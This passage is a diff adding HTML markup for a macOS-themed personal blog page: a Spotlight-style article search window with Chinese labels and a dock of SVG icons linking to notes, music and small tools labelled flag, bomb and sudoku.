+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+    <div class="window-title">聚焦搜索</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body search-body">
+      <div class="search-input-wrap">
+        <input id="search-input" class="search-input" type="search" placeholder="搜索文章..." autocomplete="off">
+        <span class="search-hint">⌘K</span>
+      </div>
+      <ul id="search-results" class="search-results"></ul>
+      <div id="search-empty" class="search-empty">未找到结果</div>
+    </div>
+  </div>
+</section>
+
+  <div class="dock">
+  <div class="dock-inner">
+    <span class="dock-item app finder">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M4 6.5c0-1.4 1.1-2.5 2.5-2.5h11c1.4 0 2.5 1.1 2.5 2.5v11c0 1.4-1.1 2.5-2.5 2.5h-11C5.1 20 4 18.9 4 17.5z"/>
+          <path d="M12 4v16"/>
+          <circle cx="9" cy="10" r="1" fill="currentColor"/>
+          <circle cx="15" cy="10" r="1" fill="currentColor"/>
+          <path d="M8.5 14.5c1 1 2.1 1.5 3.5 1.5s2.5-.5 3.5-1.5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Finder</span>
+    </span>
+    <a class="dock-item app spotlight" href="#search">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="11" cy="11" r="5.5"/>
+          <path d="M15.5 15.5L20 20"/>
+        </svg>
+      </span>
+      <span class="dock-label">聚焦搜索</span>
+    </a>
+    <a class="dock-item app notes" href="#notes">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <rect x="5" y="4.5" width="14" height="15" rx="2"/>
+          <path d="M8 8h8M8 11.5h8M8 15h5"/>
+        </svg>
+      </span>
+      <span class="dock-label">文章清单</span>
+    </a>
+    <span class="dock-item app safari">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="8"/>
+          <path d="M12 7l2.8 5.2-5.2 2.8z"/>
+        </svg>
+      </span>
+      <span class="dock-label">Safari</span>
+    </span>
+    <a class="dock-item app music" href="#music">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M9 18a2.5 2.5 0 1 0 0-5"/>
+          <path d="M9 13V6l9-2v7"/>
+          <path d="M16 16a2.5 2.5 0 1 0 0-5"/>
+        </svg>
+      </span>
+      <span class="dock-label">Music</span>
+    </a>
+    <span class="dock-item app trash">
+      <span class="dock-icon">
+        <svg class="dock-svg" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M6 8h12l-1 11H7z"/>
+          <path d="M9 8V5h6v3M5 8h14"/>
+        </svg>
+      </span>
+      <span class="dock-label">Trash</span>
+    </span>
+    <span class="dock-divider"></span>
+    
+    
+      
+      <a class="dock-item tool" href="#tool-flag">
+        <span class="dock-icon">
+          <span class="tool-letter">F</span>
+        </span>
+        <span class="dock-label">flag</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-bomb">
+        <span class="dock-icon">
+          <span class="tool-letter">B</span>
+        </span>
+        <span class="dock-label">bomb</span>
+      </a>
+    
+      
+      <a class="dock-item tool" href="#tool-sudoku">
+        <span class="dock-icon">
+          <span class="tool-letter">S</span>
+        </span>
+        <span class="dock-label">sudoku</span>
+      </a>
+    
+  </div>
+</div>
+
+
+  <!-- embed resize script removed: fixed-height iframe -->
+</body>
+</html>
